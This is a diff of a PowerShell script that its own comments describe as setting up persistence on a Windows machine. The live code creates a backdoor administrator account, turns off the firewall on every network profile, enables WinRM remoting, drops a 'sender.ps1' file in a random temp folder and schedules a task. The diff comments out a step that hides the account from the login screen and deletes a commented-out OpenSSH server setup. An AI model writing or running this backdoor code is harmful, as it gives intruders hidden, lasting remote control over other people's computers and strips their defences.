@@ -20,7 +20,6 @@ function New-RandomTempDirectory {
 
 
 $dirPath = New-RandomTempDirectory
-# Write-Host "Created directory: $dirPath"
 
 # Create Admin account for persistence
 # Run PowerShell as Administrator
@@ -40,24 +39,30 @@ New-LocalUser `
 # Add user to Administrators group
 Add-LocalGroupMember -Group "Administrators" -Member $username
 
-# Hide user from login screen
-$regPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList"
 
-# Create registry path if it does not exist
-if (-not (Test-Path $regPath)) {
-    New-Item -Path $regPath -Force | Out-Null
-}
+# # Hide user from login screen
+# $regPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList"
 
-# Set user to hidden (0 = hidden, 1 = visible)
-New-ItemProperty `
-    -Path $regPath `
-    -Name $username `
-    -PropertyType DWORD `
-    -Value 0 `
-    -Force | Out-Null
+# # Create registry path if it does not exist
+# if (-not (Test-Path $regPath)) {
+#     New-Item -Path $regPath -Force | Out-Null
+# }
+
+# # Set user to hidden (0 = hidden, 1 = visible)
+# New-ItemProperty `
+#     -Path $regPath `
+#     -Name $username `
+#     -PropertyType DWORD `
+#     -Value 0 `
+#     -Force | Out-Null
+
 
 # disable firewalls
 Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
+
+# Enable WIN-RM
+Enable-PSRemoting -Force
+
 
 # Make a sender file under the random temp folder
 $filePath = Join-Path $dirPath "sender.ps1"
@@ -97,32 +102,6 @@ Register-ScheduledTask `
     -Force
 
 
-# # Install OpenSSH Server if not installed
-# $sshServer = Get-WindowsCapability -Online | Where-Object Name -like 'OpenSSH.Server*'
-
-# if ($sshServer.State -ne "Installed") {
-#     Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
-# } 
-
-# # Set SSH service to start automatically
-# Set-Service -Name sshd -StartupType Automatic
-
-# # Start SSH service
-# Start-Service sshd
-
-# # Enable firewall rule
-# if (-not (Get-NetFirewallRule -Name "OpenSSH-Server-In-TCP" -ErrorAction SilentlyContinue)) {
-#     New-NetFirewallRule `
-#         -Name "OpenSSH-Server-In-TCP" `
-#         -DisplayName "OpenSSH Server (SSH)" `
-#         -Enabled True `
-#         -Direction Inbound `
-#         -Protocol TCP `
-#         -Action Allow `
-#         -LocalPort 22
-# } else {
-#     Enable-NetFirewallRule -Name "OpenSSH-Server-In-TCP"
-# }
 
 
     
